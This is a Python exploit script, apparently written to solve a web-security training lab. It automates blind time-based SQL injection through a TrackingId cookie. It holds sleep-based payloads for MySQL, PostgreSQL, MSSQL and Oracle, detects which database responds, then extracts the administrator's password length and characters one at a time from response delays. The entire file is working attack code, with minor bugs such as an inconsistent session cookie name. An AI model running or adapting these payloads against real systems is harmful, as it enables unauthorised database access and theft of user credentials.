# import re
import sys
import urllib.parse

import requests
import urllib3

# from bs4 import BeautifulSoup
from colorama import Fore
from requests.exceptions import RequestException

urllib3.disable_warnings()

proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

USER_NAME = "administrator"
TABLE_NAME = "users"
COLUMN_NAME = "username"
BASE_URL = ""
DBS = ["mySQL", "PostgreSQL", "MSFT", "Oracle"]
TIME_DELAY = 5


def solve_password(cookies, password_length, db):
    password_extracted = ""
    for i in range(1, password_length + 1):
        for j in range(32, 126):
            sql_queries = [
                f"' || (SELECT IF({COLUMN_NAME}='{USER_NAME}' and ascii(substr(password,{i},1))='{j}' ,SLEEP({TIME_DELAY}),'a') FROM {TABLE_NAME})-- ",
                f"' || (SELECT CASE WHEN {COLUMN_NAME}='{USER_NAME}' and ascii(substr(password,{i},1))='{j}' THEN pg_sleep({TIME_DELAY}) ELSE pg_sleep(0) END FROM {TABLE_NAME})-- ",
                f"' || IF ({COLUMN_NAME}='{USER_NAME}' FROM {TABLE_NAME} and ascii(substr(password,{i},1))='{j}') WAITFOR DELAY '0:0:{TIME_DELAY}'-- ",
                f"' || (SELECT CASE WHEN ({COLUMN_NAME}='{USER_NAME}' and ascii(substr(password,{i},1))='{j}') THEN 'a'||dbms_pipe.receive_message(('a'),{TIME_DELAY}) ELSE NULL END FROM {TABLE_NAME})--",
            ]
            sql_query_encoded = sql_queries[DBS.index(db)]
            sqli_payload_encoded = urllib.parse.quote(sql_query_encoded)
            tack_cook = cookies.get("TrackingId")
            sess_cook = cookies.get("session")
            if tack_cook is None or sess_cook is None:
                print(f"{Fore.RED}[-] Cookies not found{Fore.RESET}")
                sys.exit(0)
            cookie = {
                "TrackingId": tack_cook + sqli_payload_encoded,
                "SessionId": sess_cook,
            }
            r = requests.get(
                BASE_URL, cookies=cookie, proxies=proxies, verify=False, timeout=25
            )

            elapsed_time = r.elapsed.total_seconds()
            if elapsed_time < TIME_DELAY:
                print(
                    f"[-] Password: {Fore.YELLOW}{password_extracted}{Fore.RESET} - Testing: {Fore.YELLOW}{chr(j)}{Fore.RESET}"
                )
            else:
                password_extracted += chr(j)
                break
    print(
        f"{Fore.YELLOW}[-] Password: {password_extracted} and is {len(password_extracted)} long {Fore.RESET}"
    )
    return password_extracted


def find_password_length(cookies, db):
    password_length = 0
    for i in range(1, 50):
        sql_queries = [
            f"' || (SELECT IF({COLUMN_NAME}='{USER_NAME}' and LENGTH(password)>{i} ,SLEEP({TIME_DELAY}),'a') FROM {TABLE_NAME})-- ",
            f"' || (SELECT CASE WHEN {COLUMN_NAME}='{USER_NAME}' and LENGTH(password)>{i} THEN pg_sleep({TIME_DELAY}) ELSE pg_sleep(0) END FROM {TABLE_NAME})-- ",
            f"' || IF ({COLUMN_NAME}='{USER_NAME}' FROM {TABLE_NAME} and LENGTH(password)>{i}) WAITFOR DELAY '0:0:{TIME_DELAY}'-- ",
            f"' || (SELECT CASE WHEN ({COLUMN_NAME}='{USER_NAME}' and LENGTH(password)>{i}) THEN 'a'||dbms_pipe.receive_message(('a'),{TIME_DELAY}) ELSE NULL END FROM {TABLE_NAME})--",
        ]
        sql_query_encoded = sql_queries[DBS.index(db)]
        sqli_payload_encoded = urllib.parse.quote(sql_query_encoded)
        tack_cook = cookies.get("TrackingId")
        sess_cook = cookies.get("session")
        if tack_cook is None or sess_cook is None:
            print(f"{Fore.RED}[-] Cookies not found{Fore.RESET}")
            sys.exit(0)
        cookie = {
            "TrackingId": tack_cook + sqli_payload_encoded,
            "session": sess_cook,
        }
        r = requests.get(
            BASE_URL, cookies=cookie, proxies=proxies, verify=False, timeout=25
        )
        elapsed_time = r.elapsed.total_seconds()
        print(f"{Fore.GREEN}[-] Password length: more than {i} {Fore.RESET}")
        if elapsed_time < TIME_DELAY:
            password_length = i
            break
    print(f"{Fore.YELLOW}[-] Password length: {password_length} {Fore.RESET}")
    return password_length


def check_table_name_time(cookies, db):
    sql_queries = [
        f"' || (SELECT IF({COLUMN_NAME}='{USER_NAME}',SLEEP({TIME_DELAY}),'a') FROM {TABLE_NAME})-- ",
        f"' || (SELECT CASE WHEN {COLUMN_NAME}='{USER_NAME}' THEN pg_sleep({TIME_DELAY}) ELSE pg_sleep(0) END FROM {TABLE_NAME})-- ",
        f"' || IF ({COLUMN_NAME}='{USER_NAME}' FROM {TABLE_NAME}) WAITFOR DELAY '0:0:{TIME_DELAY}'-- ",
        f"' || (SELECT CASE WHEN ({COLUMN_NAME}='{USER_NAME}') THEN 'a'||dbms_pipe.receive_message(('a'),{TIME_DELAY}) ELSE NULL END FROM {TABLE_NAME})--",
    ]
    sql_query = sql_queries[DBS.index(db)]
    print(sql_query)
    sql_query_encoded = urllib.parse.quote(sql_query)
    tack_cook = cookies.get("TrackingId")
    sess_cook = cookies.get("session")
    if tack_cook is None or sess_cook is None:
        print(f"{Fore.RED}[-] Cookies not found{Fore.RESET}")
        sys.exit(0)
    cookie = {
        "TrackingId": tack_cook + sql_query_encoded,
        "session": sess_cook,
    }
    r = requests.get(
        BASE_URL, cookies=cookie, proxies=proxies, verify=False, timeout=25
    )
    elapsed_time = r.elapsed.total_seconds()
    if elapsed_time >= TIME_DELAY:
        print(f"{Fore.GREEN}[-] {TABLE_NAME} table exists {Fore.RESET}")
    else:
        print(f"{Fore.RED}[-] {TABLE_NAME} table does not exist {Fore.RESET}")
        sys.exit(0)


def check_constant_time(cookies, db):
    check_table_name_time(cookies, db)
    pswd_len = find_password_length(cookies, db)
    solve_password(cookies, pswd_len, db)


def check_if_vuln_time_delay(cookies):
    payloads = [
        f"' || (SELECT SLEEP({TIME_DELAY}))--",
        f"' || (SELECT pg_sleep({TIME_DELAY}))--",
        f"' || (WAITFOR DELAY ''0:0:{TIME_DELAY}'')--",
        f"' || (dbms_pipe.receive_message(('a'),{TIME_DELAY}))--",
    ]
    tack_cook = cookies.get("TrackingId")
    sess_cook = cookies.get("session")

    for index, payload in enumerate(payloads):
        encoded_py = urllib.parse.quote(payload)
        cookie = {
            "TrackingId": tack_cook + encoded_py,
            "session": sess_cook,
        }
        r = requests.get(
            BASE_URL, cookies=cookie, proxies=proxies, verify=False, timeout=25
        )
        elapsed_time = r.elapsed.total_seconds()
        if elapsed_time >= TIME_DELAY:
            print(
                f"{Fore.GREEN}[+] DB ({DBS[index]}) is vulnerable to time delay{Fore.RESET}"
            )
            check_constant_time(cookies, DBS[index])
            return
        print(
            f"{Fore.RED}[-] DB ({DBS[index]})is NOT vulnerable to time delay{Fore.RESET}"
        )


def get_cookies_from_url():
    try:
        r = requests.get(BASE_URL, proxies=proxies, verify=False, timeout=5)
        if r.status_code == 200:
            cookies = {
                "TrackingId": r.cookies.get("TrackingId"),
                "session": r.cookies.get("session"),
            }
            return cookies

        print(f"HTTP GET request failed with status code: {r.status_code}")
        sys.exit(0)
    except RequestException as e:
        print(f"An error occurred: {str(e)}")
        sys.exit(0)


def exploit():
    global TIME_DELAY
    cookies = get_cookies_from_url()
    print(f"{Fore.GREEN}[+] Cookies: {cookies}{Fore.RESET}")
    TIME_DELAY = int(input("Please, enter the time delay (in seconds): "))
    print("time delay: " + str(TIME_DELAY))
    check_if_vuln_time_delay(cookies)


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        BASE_URL = url

    except IndexError:
        print(f"[-] Usage: {sys.argv[0]} <url>")
        print(
            f'[-] Example: {sys.argv[0]} USER_NAME = "administrator" TABLE_NAME = "users" COLUMN_NAME = "username""'
        )
        sys.exit(-1)

    print("[*] Exploiting...")
    exploit()
